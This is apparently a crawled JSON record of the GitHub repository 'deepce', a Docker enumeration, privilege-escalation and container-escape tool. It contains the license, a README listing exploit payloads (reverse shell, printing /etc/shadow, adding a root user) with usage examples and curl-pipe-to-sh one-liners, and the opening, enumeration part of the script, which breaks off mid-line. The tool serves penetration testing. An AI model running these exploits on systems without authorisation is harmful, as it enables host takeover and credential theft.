{
  "metadata": {
    "timestamp": 1736568703497,
    "page": 796,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjc5OQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "stealthcopter/deepce",
      "stars": 1228,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.048828125,
          "content": "tests/results/*.html\ntests/results/*.log\n.vagrant\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 11.0908203125,
          "content": "                                 Apache License\n                           Version 2.0, January 2004\n                        http://www.apache.org/licenses/\n\n   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION\n\n   1. Definitions.\n\n      \"License\" shall mean the terms and conditions for use, reproduction,\n      and distribution as defined by Sections 1 through 9 of this document.\n\n      \"Licensor\" shall mean the copyright owner or entity authorized by\n      the copyright owner that is granting the License.\n\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n      outstanding shares, or (iii) beneficial ownership of such entity.\n\n      \"You\" (or \"Your\") shall mean an individual or Legal Entity\n      exercising permissions granted by this License.\n\n      \"Source\" form shall mean the preferred form for making modifications,\n      including but not limited to software source code, documentation\n      source, and configuration files.\n\n      \"Object\" form shall mean any form resulting from mechanical\n      transformation or translation of a Source form, including but\n      not limited to compiled object code, generated documentation,\n      and conversions to other media types.\n\n      \"Work\" shall mean the work of authorship, whether in Source or\n      Object form, made available under the License, as indicated by a\n      copyright notice that is included in or attached to the work\n      (an example is provided in the Appendix below).\n\n      \"Derivative Works\" shall mean any work, whether in Source or Object\n      form, that is based on (or derived from) the Work and for which the\n      editorial revisions, annotations, elaborations, or other modifications\n      represent, as a whole, an original work of authorship. For the purposes\n      of this License, Derivative Works shall not include works that remain\n      separable from, or merely link (or bind by name) to the interfaces of,\n      the Work and Derivative Works thereof.\n\n      \"Contribution\" shall mean any work of authorship, including\n      the original version of the Work and any modifications or additions\n      to that Work or Derivative Works thereof, that is intentionally\n      submitted to Licensor for inclusion in the Work by the copyright owner\n      or by an individual or Legal Entity authorized to submit on behalf of\n      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n      designated in writing by the copyright owner as \"Not a Contribution.\"\n\n      \"Contributor\" shall mean Licensor and any individual or Legal Entity\n      on behalf of whom a Contribution has been received by Licensor and\n      subsequently incorporated within the Work.\n\n   2. Grant of Copyright License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      copyright license to reproduce, prepare Derivative Works of,\n      publicly display, publicly perform, sublicense, and distribute the\n      Work and such Derivative Works in Source or Object form.\n\n   3. Grant of Patent License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      (except as stated in this section) patent license to make, have made,\n      use, offer to sell, sell, import, and otherwise transfer the Work,\n      where such license applies only to those patent claims licensable\n      by such Contributor that are necessarily infringed by their\n      Contribution(s) alone or by combination of their Contribution(s)\n      with the Work to which such Contribution(s) was submitted. If You\n      institute patent litigation against any entity (including a\n      cross-claim or counterclaim in a lawsuit) alleging that the Work\n      or a Contribution incorporated within the Work constitutes direct\n      or contributory patent infringement, then any patent licenses\n      granted to You under this License for that Work shall terminate\n      as of the date such litigation is filed.\n\n   4. Redistribution. You may reproduce and distribute copies of the\n      Work or Derivative Works thereof in any medium, with or without\n      modifications, and in Source or Object form, provided that You\n      meet the following conditions:\n\n      (a) You must give any other recipients of the Work or\n          Derivative Works a copy of this License; and\n\n      (b) You must cause any modified files to carry prominent notices\n          stating that You changed the files; and\n\n      (c) You must retain, in the Source form of any Derivative Works\n          that You distribute, all copyright, patent, trademark, and\n          attribution notices from the Source form of the Work,\n          excluding those notices that do not pertain to any part of\n          the Derivative Works; and\n\n      (d) If the Work includes a \"NOTICE\" text file as part of its\n          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n          within a display generated by the Derivative Works, if and\n          wherever such third-party notices normally appear. The contents\n          of the NOTICE file are for informational purposes only and\n          do not modify the License. You may add Your own attribution\n          notices within Derivative Works that You distribute, alongside\n          or as an addendum to the NOTICE text from the Work, provided\n          that such additional attribution notices cannot be construed\n          as modifying the License.\n\n      You may add Your own copyright statement to Your modifications and\n      may provide additional or different license terms and conditions\n      for use, reproduction, or distribution of Your modifications, or\n      for any such Derivative Works as a whole, provided Your use,\n      reproduction, and distribution of the Work otherwise complies with\n      the conditions stated in this License.\n\n   5. Submission of Contributions. Unless You explicitly state otherwise,\n      any Contribution intentionally submitted for inclusion in the Work\n      by You to the Licensor shall be under the terms and conditions of\n      this License, without any additional terms or conditions.\n      Notwithstanding the above, nothing herein shall supersede or modify\n      the terms of any separate license agreement you may have executed\n      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n   7. Disclaimer of Warranty. Unless required by applicable law or\n      agreed to in writing, Licensor provides the Work (and each\n      Contributor provides its Contributions) on an \"AS IS\" BASIS,\n      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n      implied, including, without limitation, any warranties or conditions\n      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A\n      PARTICULAR PURPOSE. You are solely responsible for determining the\n      appropriateness of using or redistributing the Work and assume any\n      risks associated with Your exercise of permissions under this License.\n\n   8. Limitation of Liability. In no event and under no legal theory,\n      whether in tort (including negligence), contract, or otherwise,\n      unless required by applicable law (such as deliberate and grossly\n      negligent acts) or agreed to in writing, shall any Contributor be\n      liable to You for damages, including any direct, indirect, special,\n      incidental, or consequential damages of any character arising as a\n      result of this License or out of the use or inability to use the\n      Work (including but not limited to damages for loss of goodwill,\n      work stoppage, computer failure or malfunction, or any and all\n      other commercial damages or losses), even if such Contributor\n      has been advised of the possibility of such damages.\n\n   9. Accepting Warranty or Additional Liability. While redistributing\n      the Work or Derivative Works thereof, You may choose to offer,\n      and charge a fee for, acceptance of support, warranty, indemnity,\n      or other liability obligations and/or rights consistent with this\n      License. However, in accepting such obligations, You may act only\n      on Your own behalf and on Your sole responsibility, not on behalf\n      of any other Contributor, and only if You agree to indemnify,\n      defend, and hold each Contributor harmless for any liability\n      incurred by, or claims asserted against, such Contributor by reason\n      of your accepting any such warranty or additional liability.\n\n   END OF TERMS AND CONDITIONS\n\n   APPENDIX: How to apply the Apache License to your work.\n\n      To apply the Apache License to your work, attach the following\n      boilerplate notice, with the fields enclosed by brackets \"[]\"\n      replaced with your own identifying information. (Don't include\n      the brackets!)  The text should be enclosed in the appropriate\n      comment syntax for the file format. We also recommend that a\n      file or class name and description of purpose be included on the\n      same \"printed page\" as the copyright notice for easier\n      identification within third-party archives.\n\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 6.1923828125,
          "content": "# deepce\n\n```\n                      ##         .\n                ## ## ##        ==\n             ## ## ## ##       ===\n         /\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\\___/ ===\n    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~\n         \\______ X           __/\n           \\    \\         __/\n            \\____\\_______/\n          __                        \n     ____/ /__  ___  ____  ________ \n    / __  / _ \\/ _ \\/ __ \\/ ___/ _ \\   ENUMERATE\n   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE\n   \\__,_/\\___/\\___/ .___/\\___/\\___/  ESCAPE\n                 /_/\n```\n\n![ShellCheck](https://github.com/stealthcopter/deepce/workflows/ShellCheck/badge.svg)\n![ContainerTests](https://github.com/stealthcopter/deepce/workflows/ContainerTests/badge.svg)\n<a href=\"https://www.buymeacoffee.com/stealthcopter\"><img src=\"https://cdn.buymeacoffee.com/buttons/v2/arial-yellow.png\" height=\"20px\"></a>\n\n[![Twitter](https://img.shields.io/badge/-@stealthcopter-%232B90D9?style=for-the-badge&logo=twitter&logoColor=white&label=twitter)](https://twitter.com/stealthcopter)\n\n[Website](https://stealthcopter.github.io/deepce/)\n\nDocker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)\n\nIn order for it to be compatible with the maximum number of containers DEEPCE is written in pure `sh` with no dependencies. It will make use of additional tools such as curl, nmap, nslookup and dig if available but for the most part is not reliant upon them for enumeration.\n\nNone of the enumeration should touch the disk, however most of the exploits create new containers which will cause disk writes, and some exploits will overwrite runC which can be destructive, so be careful!\n\nPlease see below for a list of the enumerations, exploits and payloads DEEPCE can use. If you have ideas for anymore please submit an issue in github!\n\n# Downloading\n\nDEEPCE can be downloaded onto a host or container using one of the following one-liners. Tip: download to `/dev/shm` to avoid touching the disk.\n\n```bash\nwget https://github.com/stealthcopter/deepce/raw/main/deepce.sh\ncurl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh\n# Or using python requests\npython -c 'import requests;print(requests.get(\"https://github.com/stealthcopter/deepce/raw/main/deepce.sh\").content)' > deepce.sh \npython3 -c 'import requests;print(requests.get(\"https://github.com/stealthcopter/deepce/raw/main/deepce.sh\").content.decode(\"utf-8\"))' > deepce.sh  \n```\n\n# Support\nIf you love what I'm doing with Deepce and my other projects, you can now support my work directly! By buying me a coffee ☕, you're not just fueling my caffeine needs – you're helping me dedicate more time to developing and improving these open source projects. Every coffee counts and brings more innovation to the cybersecurity world. Thank you for your support – it means the world to me and the open source community!\n\n<a href=\"https://www.buymeacoffee.com/stealthcopter\"><img src=\"https://cdn.buymeacoffee.com/buttons/v2/arial-yellow.png\" height=\"50px\"></a>\n\n# Screenshots\nFor more please view the [docs folder](https://github.com/stealthcopter/deepce/tree/main/docs)\n![screenshot1](docs/images/ubuntu-install-tools.png \"Screenshot 1\")\n\n## Enumerations\n\nThe following is the list of enumerations performed by DEEPCE. \n\n- Container ID & name (via reverse dns)\n- Container IP / DNS Server\n- Docker Version\n- Interesting mounts\n- Passwords in common files\n- Environment variables\n- Password hashes\n- Common sensitive files stored in containers\n- Other containers on same network\n- Port scan other containers, and the host machine itself\n- Find exposed docker sock\n\n## Exploits\n\n- Docker Group Privilege Escalation\n- Privileged mode host command execution\n- Exposed Docker Sock\n\n## Payloads\n\nFor each of the exploits above payloads can be defined in order to exploit the host system. These include:\n\n- Reverse TCP shell\n- Print /etc/shadow\n- Add new root user\n- Run custom commands\n- Run custom payload binaries\n\n# Examples\n```bash\n# Make the script executable and then run it\nchmod +x ./deepce.sh\n./deepce.sh \n```\n\n## Exploits\nThe following examples show the different kinds of exploits that can be performed and the avaliable payloads.\n\n- Exploit a privileged container to create a new root user on the host operating system:\n```bash\n./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce\n```\n\n- Exploit a writable docker sock file in order to print the contents of `/etc/shadow`\n```bash\n./deepce.sh --no-enumeration --exploit SOCK --shadow\n```\n\n- Escalate to root via membership to the docker group on a host and run a custom payload\n```bash\n./deepce.sh --no-enumeration --exploit DOCKER --command \"whoami>/tmp/hacked\"\n```\n\n# Advanced Usage\n\nIt is possible to download and run deepce without touching the disk, however you will be unable to easily set arguments (direct manipulation of variables is possible using export).\n\n```bash\nwget -O - https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh\ncurl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh\n```\n\n# Inspiration\n\nThere are some great container enumeration/escape scripts and enumeration tools that I've got inspiration from when writing this. However I felt the need to write one purely in `sh` in order to avoid having to install go / ruby dependencies or be reliant on a static binary. I also wanted to be able to perform more enumerations to try to discover what the docker container is as during as test we may end up inside an unknown container. The number of things this script can enumerate got away from me as every time I added something new I thought of more additional things I could add.\n\n- [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)\n- [LinEnum](https://github.com/rebootuser/LinEnum)\n- [BotB](https://github.com/brompwnie/botb)\n- [Harpoon](https://github.com/ProfessionallyEvil/harpoon)\n\n# Resources\n\nDevelopers looking for Docker security tips\nhttps://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md\n\n\n# Contributing\n\nI welcome pull requests, issues and feedback.\n\n- Fork it\n- Create your feature branch (git checkout -b my-new-feature)\n- Commit your changes (git commit -am 'Added some feature')\n- Push to the branch (git push origin my-new-feature)\n- Create new Pull Request\n"
        },
        {
          "name": "deepce.sh",
          "type": "blob",
          "size": 38.4931640625,
          "content": "#!/bin/sh\n\n# shellcheck disable=SC2034\nVERSION=\"v0.1.0\"\nADVISORY=\"deepce should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.\"\n\n###########################################\n#---------------) Colors (----------------#\n###########################################\n\nC=$(printf '\\033')\nRED=\"${C}[1;31m\"\nGREEN=\"${C}[1;32m\"\nY=\"${C}[1;33m\"\nB=\"${C}[1;34m\"\nLG=\"${C}[1;37m\" #LightGray\nDG=\"${C}[1;90m\" #DarkGray\nNC=\"${C}[0m\"\nUNDERLINED=\"${C}[4m\"\nEX=\"${C}[48;5;1m\"\n\nbanner() {\n  if [ \"$quiet\" ]; then\n    return\n  fi\n\n  cat <<EOF\n\n$DG                      ##$LG         .\n$DG                ## ## ##$LG        ==\n$DG             ## ## ## ##$LG       ===\n$LG         /\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\\___/ ===\n$B    ~~~ $DG{$B~~ ~~~~ ~~~ ~~~~ ~~~ ~$DG /  $LG===-$B ~~~$NC\n$DG         \\______ X           __/\n$DG           \\    \\         __/\n$DG            \\____\\_______/$NC\n          __\n     ____/ /__  ___  ____  ________\n    / __  / _ \\/ _ \\/ __ \\/ ___/ _ \\ $DG  ENUMERATE$NC\n   / /_/ /  __/  __/ /_/ / (__/  __/ $DG ESCALATE$NC\n   \\__,_/\\___/\\___/ .___/\\___/\\___/$DG  ESCAPE$NC\n                 /_/\n\n Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)\n by stealthcopter\n\nEOF\n}\n\nshow_help() {\n  cat <<EOF\nUsage: ${0##*/} [OPTIONS...]\n\n  -ne,--no-enum          Don't perform enumeration, useful for skipping straight to exploits\n  -nn,--no-network       Don't perform any network operations\n  -nc,--no-colors        Don't use terminal colors\n\n  --install              Install useful packages before running script, this will maximise enumeration and exploitation potential\n\n  -doc, --delete         Script will delete itself on completion\n\n  ${DG}[Exploits]$NC\n  -e, --exploit          Use one of the following exploits (eg. -e SOCK)\n\n    DOCKER               use docker command to create new contains and mount root partition to priv esc\n    PRIVILEGED           exploit a container with privileged mode to run commands on the host\n    SOCK                 use an exposed docker sock to create a new container and mount root partition to priv esc\n    CVE-2019-5746\n    CVE-2019-5021\n    SYS_MODULE           Exploit the SYS_MODULE privilege to create a malicious kernel module and obtain root on the host\n\n  ${DG}[Payloads & Options]$NC\n  -i, --ip               The local host IP address for reverse shells to connect to\n  -p, --port             The port to use for bind or reverse shells\n  -l, --listen           Automatically create the reverse shell listener\n\n  -s, --shadow           Print the shadow file as the payload\n\n  -cmd, --command        Run a custom command as the payload\n\n  -x, --payload          Run a custom executable as the payload\n\n  --username             Create a new root user\n  --password             Password for new root user\n\n  ${DG}[General Options]$NC\n  -q, --quiet            Shhhh, be less verbose\n  -h, --help             Display this help and exit.\n\n  [Examples]\n  $DG# Exploit docker to get a local shell as root$NC\n  ./deepce.sh -e DOCKER\n\n  $DG# Exploit an exposed docker sock to get a reverse shell as root on the host$NC\n  ./deepce.sh -e SOCK -l -i 192.168.0.23 -p 4444\n\nEOF\n}\n\n###########################################\n#--------------) Constants (--------------#\n###########################################\n\n# Note we use space separated strings for arrays as sh does not support arrays.\nPATH_APPS=\"/app /usr/src/app /usr/src/myapp /home/node/app /go/src/app /var/www/html /usr/local/tomcat /mosquitto /opt/sonarqube /var/lib/ghost /var/jenkins_home /var/lib/rabbitmq /etc/rabbitmq /var/lib/mysql /usr/local/apache2 /etc/nginx /usr/share /usr/local/etc/redis /etc/traefik /var/lib/postgresql /opt/couchbase\"\nCONFIG_FILES=\"/usr/local/apache2/conf/httpd.conf /etc/traefik/traefik.toml /etc/traefik/traefik.yml /etc/mysql/conf.d /etc/mysql/my.cnf /etc/rabbitmq/rabbitmq.config\"\n\nGREP_SECRETS=\"pass\\|secret\\|key\"\nGREP_SOCK_INFOS=\"Architecture\\|OSType\\|Name\\|DockerRootDir\\|NCPU\\|OperatingSystem\\|KernelVersion\\|ServerVersion\"\nGREP_SOCK_INFOS_IGNORE=\"IndexConfig\"\nGREP_IGNORE_MOUNTS=\"/ /\\|/cgroup\\|/var/lib/docker/\\|/null \\| proc proc \\|/dev/console\\|docker.sock\"\n\nTIP_NETWORK_ENUM=\"By default containers can communicate with other containers on the same network and the host machine, this can be used to enumerate further\"\nTIP_WRITABLE_SOCK=\"The docker sock is writable, we should be able to enumerate docker, create containers and obtain root privs on the host machine\nSee ${UNDERLINED}https://stealthcopter.github.io/deepce/guides/docker-sock.md${NC}\"\nTIP_DNS_CONTAINER_NAME=\"Reverse DNS lookup of container name requires host, dig or nslookup to get the container name\"\nTIP_DOCKER_GROUP=\"Users in the docker group can escalate to root on the host by mounting the host partition inside the container and chrooting into it.\ndeepce.sh -e DOCKER\nSee ${UNDERLINED}https://stealthcopter.github.io/deepce/guides/docker-group.md${NC}\"\nTIP_DOCKER_CMD=\"If we have permission to create new docker containers we can mount the host's root partition and chroot into it and execute commands on the host OS.\"\nTIP_PRIVILEGED_MODE=\"The container appears to be running in privilege mode, we should be able to access the raw disks and mount the hosts root partition in order to gain code execution.\nSee ${UNDERLINED}https://stealthcopter.github.io/deepce/guides/docker-privileged.md${NC}\"\nTIP_DOCKER_ROOTLESS=\"In rootless mode privilege escalation to root will not be possible.\"\n\nTIP_CVE_2019_5021=\"Alpine linux version 3.3.x-3.5.x accidentally allow users to login as root with a blank password, if we have command execution in the container we can become root using su root\"\nTIP_CVE_2019_13139=\"Docker versions before 18.09.4 are vulnerable to a command execution vulnerability when parsing URLs\"\nTIP_CVE_2019_5736=\"Docker versions before 18.09.2 are vulnerable to a container escape by overwriting the runC binary\"\n\nTIP_SYS_MODULE=\"Giving the container the SYS_MODULE privilege allows for kernel modules to be mounted. Using this, a malicious module can be used to execute code as root on the host.\"\n\nDANGEROUS_GROUPS=\"docker\\|lxd\\|root\\|sudo\\|wheel\"\nDANGEROUS_CAPABILITIES=\"cap_sys_admin\\|cap_sys_ptrace\\|cap_sys_module\\|dac_read_search\\|dac_override\\|cap_sys_rawio\\|cap_mknod\"\n\nCONTAINER_CMDS=\"docker lxc rkt kubectl podman\"\nUSEFUL_CMDS=\"curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap\"\n\n###########################################\n#---------------) Helpers (---------------#\n###########################################\n\n# Convert version numbers into a regular number so we can do simple comparisons (use floats because sh can interpret 0 prefix numbers incorrectly otherwise).\n# shellcheck disable=SC2046\n# shellcheck disable=SC2183 # word splitting here is on purpose\nver() { printf \"%03.0f%03.0f%03.0f\" $(echo \"$1\" | tr '.' ' ' | cut -d '-' -f1); }\n\n###########################################\n#--------------) Printing (---------------#\n###########################################\n\nprinter() {\n  # Only print if not empty\n  if [ \"$2\" ]; then\n    # Temporarily replace the IFS with null to preserve newline chars\n    OLDIFS=$IFS\n    IFS=\n    printf \"%s%s%s\\n\" \"$1\" \"$2\" \"$NC\"\n    # Restore it so we don't break anything else\n    IFS=$OLDIFS\n  fi\n}\n\nprintSection() {\n  # Print a section like:\n  # ========================================( Title here )========================================\n  l=94\n  if [ \"$1\" ]; then\n    s=\"( $1 )\"\n  else\n    s=\"$1\"\n  fi\n  size=${#s}\n  no=$((l-size))\n  start=$((no/2))\n  end=$((no-start))\n  printf \"%s%${start}s\" \"$B\" | tr \" \" \"=\"\n  printf \"%s%s%s\" \"$GREEN\" \"$s\" \"$B\"\n  printf \"%${end}s\" | tr \" \" \"=\"\n  printf \"%s\\n\" \"$NC\"\n}\n\nprintEx() { printer \"$EX\" \"$1\"; }\nprintFail() { printer \"$DG\" \"$1\"; }\nprintInfo() { printer \"$LG\" \"$1\"; }\nprintError() { printer \"$RED\" \"$1\"; }\nprintSuccess() { printer \"$Y\" \"$1\"; }\nprintQuestion() { printf \"%s[+]%s %s %s\" \"$Y\" \"$GREEN\" \"$1\" \"$NC\"; }\nprintStatus() { printer \"$DG\" \"$1\"; }\nprintYesEx() { printEx Yes; }\nprintYes() { printSuccess Yes; }\nprintNo() { printFail No; }\nTODO() { printError \"${NC}TODO $1\"; }\nnl() { echo \"\"; }\n\nprintTip() {\n  if [ \"$quiet\" ]; then\n    return\n  fi\n    printer \"$DG\" \"$1\" | fold -s -w 95\n  nl\n}\n\nprintResult() {\n  printQuestion \"$1\"\n  if [ \"$2\" ]; then\n    printSuccess \"$2\"\n  else\n    if [ \"$3\" ]; then\n      printError \"$3\"\n    else\n      printNo\n    fi\n  fi\n}\n\nprintResultLong() {\n  printQuestion \"$1\"\n  if [ \"$2\" ]; then\n    printYes\n    printStatus \"$2\"\n  else\n    if [ \"$3\" ]; then\n      printError \"$3\"\n    else\n      printNo\n    fi\n  fi\n}\n\nprintMsg() {\n  printQuestion \"$1\"\n  printFail \"$2\"\n}\n\nprintInstallAdvice() {\n  printError \"$1 is required but not installed\"\n  # TODO: Test install options\n  # TODO: Rename some with correct package names\n  if [ -x \"$(command -v apt)\" ]; then\n    # Debian based OSes\n    # TODO dig / nslookup / host -> dnsutils\n    printError \"apt install -y $1\"\n  elif [ -x \"$(command -v apk)\" ]; then\n    # Alpine\n    # TODO: dig / nslookup -> bind-tools\n    printError \"apk add $1\"\n  elif [ -x \"$(command -v yum)\" ]; then\n    # CentOS / Fedora\n    # TODO: dig / nslookup -> bind-utils\n    printError \"yum install $1\"\n  elif [ -x \"$(command -v apt-get)\" ]; then\n    # Old Debian\n    # TODO dig / nslookup / host -> dnsutils\n    printError \"apt-get install -y $1\"\n  fi\n  nl\n}\n\ninstallPackages() {\n  if ! [ \"$install\" ]; then\n    return\n  fi\n\n  if ! [ \"$(id -u)\" = 0 ]; then\n    # TODO: Elevate via sudo\n    printError \"Need to be root to install packages...\"\n    return\n  fi\n\n  printSection \"Installing Packages\"\n  if [ -x \"$(command -v apt)\" ]; then\n    # Debian based OSes\n    printQuestion \"Installing Packages .....\"\n\n    export DEBIAN_FRONTEND=noninteractive\n    if ! [ \"$(apt update 2>/dev/null)\" ]; then #\n        printError \"Failed\"\n        return\n    fi\n\n    if apt install --no-install-recommends --force-yes -y dnsutils curl nmap iputils-ping libcap2-bin >/dev/null 2>&1; then\n        printSuccess \"Success\"\n    else\n        printError \"Failed\"\n    fi\n\n  elif [ -x \"$(command -v apk)\" ]; then\n    # Alpine\n    apk add bind-tools curl nmap libcap\n  elif [ -x \"$(command -v yum)\" ]; then\n    # CentOS / Fedora\n    yum install bind-utils curl nmap libcap\n  elif [ -x \"$(command -v apt-get)\" ]; then\n    # Old Debian\n    apt-get install -y dnsutils curl nmap inetutils-ping libcap2-bin\n  fi\n}\n\nunsetColors(){\n  RED=\"\"\n  GREEN=\"\"\n  Y=\"\"\n  B=\"\"\n  LG=\"\"\n  DG=\"\"\n  NC=\"\"\n  UNDERLINED=\"\"\n  EX=\"\"\n}\n\ndescribeColors(){\n  # Describe the colors unless they have been unset or we're being quiet\n  if [ \"$quiet\" ] || ! [ \"$RED\" ]; then\n    return\n  fi\n  printSection \"Colors\"\n  printQuestion \"Exploit Test ............\"; printEx \"Exploitable - Check this out\";\n  printResult \"Basic Test ..............\" \"Positive Result\"\n  printResult \"Another Test ............\" \"\" \"Error running check\"\n  printQuestion \"Negative Test ...........\"; printNo;\n  printResultLong \"Multi line test .........\" \"Command output\nspanning multiple lines\"\n  nl\n  printTip \"Tips will look like this and often contains links with additional info. You can usually ctrl+click links in modern terminal to open in a browser window\nSee ${UNDERLINED}https://stealthcopter.github.io/deepce${NC}\"\n}\n\n###########################################\n#---------------) Checks (----------------#\n###########################################\n\ncontainerCheck() {\n  # Are we inside docker?\n  inContainer=\"\"\n  if [ -f \"/.dockerenv\" ]; then\n    inContainer=\"1\"\n    containerType=\"docker\"\n  fi\n\n  # Additional check in case .dockerenv removed\n  if grep \"/docker/\" /proc/1/cgroup -qa; then\n    inContainer=\"1\"\n    containerType=\"docker\"\n  fi\n\n  #Docker check: cat /proc/1/attr/current\n\n  # Are we inside kubenetes?\n  if grep \"/kubepod\" /proc/1/cgroup -qa; then\n    inContainer=\"1\"\n    containerType=\"kubernetes\"\n  fi\n\n  # Are we inside LXC?\n  if env | grep \"container=lxc\" -qa; then\n    inContainer=\"1\"\n    containerType=\"lxc\"\n  fi\n  if grep \"/lxc/\" /proc/1/cgroup -qa; then\n    inContainer=\"1\"\n    containerType=\"lxc\"\n  fi\n}\n\ncontainerType() {\n  printResult \"Container Platform ......\" \"$containerType\" \"Unknown\"\n}\n\nuserCheck() {\n  printQuestion \"User ....................\"\n  if [ \"$(id -u)\" = 0 ]; then\n    isUserRoot=\"1\"\n    printEx \"root\"\n  else\n    printSuccess \"$(whoami)\"\n  fi\n\n  printQuestion \"Groups ..................\"\n  groups=$(groups| sed \"s/\\($DANGEROUS_GROUPS\\)/${LG}${EX}&${NC}${DG}/g\")\n  printStatus \"$groups\" \"None\"\n\n  if ! [ $isUserRoot ]; then\n    printQuestion \"Sudo ....................\"\n    if [ -x \"$(command -v sudo)\" ]; then\n      if sudo -n -l 2>/dev/null; then\n        printEx \"Passwordless Sudo\"\n        isUserHasSudo=\"1\"\n      else\n        printError \"Password required\"\n      fi\n    else\n      printError \"sudo not found\"\n    fi\n  else\n    printQuestion \"Sudoers .................\"\n    if [ -r /etc/sudoers ]; then\n      sudoers=$(grep -v \"#\\|^$\\|^Defaults\\|@include\" /etc/sudoers)\n      printYes\n      printStatus \"$sudoers\"\n    else\n      printNo\n    fi\n  fi\n}\n\ndockerSockCheck() {\n  # Is the docker sock exposed\n  printQuestion \"Docker Sock .............\"\n  dockerSockPath=\"\"\n  if [ -S \"/var/run/docker.sock\" ]; then\n    dockerSockPath=\"/var/run/docker.sock\"\n    printYes\n  else\n    printFail \"Not Found\"\n    # TODO: Search elsewhere for sock?\n  fi\n\n  if [ \"$dockerSockPath\" ]; then\n\n    printInfo \"$(ls -lah $dockerSockPath)\"\n\n    # Is docker sock writable\n    printQuestion \"Sock is writable ........\"\n    if test -r \"$dockerSockPath\"; then\n      printYesEx\n      printTip \"$TIP_WRITABLE_SOCK\"\n      if [ -x \"$(command -v curl)\" ]; then\n        sockInfoCmd=\"curl -s --unix-socket $dockerSockPath http://localhost/info\"\n        sockInfoRepsonse=\"$($sockInfoCmd)\"\n\n        printTip \"To see full info from the docker sock output run the following\"\n        printStatus \"$sockInfoCmd\"\n        nl\n\n        # Docker version unknown lets get it from the sock\n        if [ -z \"$dockerVersion\" ]; then\n          # IF jq...\n          #dockerVersion=`$sockInfoCmd | jq -r '.ServerVersion'`\n          dockerVersion=$(echo \"$sockInfoRepsonse\" | tr ',' '\\n' | grep 'ServerVersion' | cut -d'\"' -f 4)\n        fi\n\n        # Get info from sock\n        info=$(echo \"$sockInfoRepsonse\" | tr ',' '\\n' | grep \"$GREP_SOCK_INFOS\" | grep -v \"$GREP_SOCK_INFOS_IGNORE\" | tr -d '\"')\n\n        printInfo \"$info\"\n      else\n        printError \"Could not interact with the docker sock, as curl is not installed\"\n        printInstallAdvice \"curl\"\n      fi\n    else\n      printNo\n    fi\n  fi\n}\n\nenumerateContainer() {\n  printSection \"Enumerating Container\"\n  containerID\n  containerName\n  containerIPs\n  getContainerInformation\n  containerCapabilities\n  containerServices\n  containerPrivileges\n  containerExploits\n}\n\ncontainerID() {\n  # Get container ID\n  containerID=\"$(cat /etc/hostname || uname -n || hostname)\"\n  # Get container full ID\n  printResult \"Container ID ............\" \"$containerID\" \"Unknown\"\n\n  if [ \"$containerType\" = \"docker\" ]; then\n    containerFullID=$(basename \"$(cat /proc/1/cpuset)\")\n    printResult \"Container Full ID .......\" \"$containerFullID\" \"Unknown\"\n  fi\n}\n\ncontainerIPs() {\n  sleep 2\n\n  # Get container IP\n  if [ -x \"$(command -v hostname)\" ]; then\n    containerIP=\"$(hostname -I 2>/dev/null || hostname -i)\"\n  elif [ -x \"$(command -v ip)\" ]; then\n    containerIP=\"$(ip route get 1 | head -1 | cut -d' ' -f7)\" # FIXME: Use sed as fields are inconsistent\n  fi\n\n  printResult \"Container IP ............\" 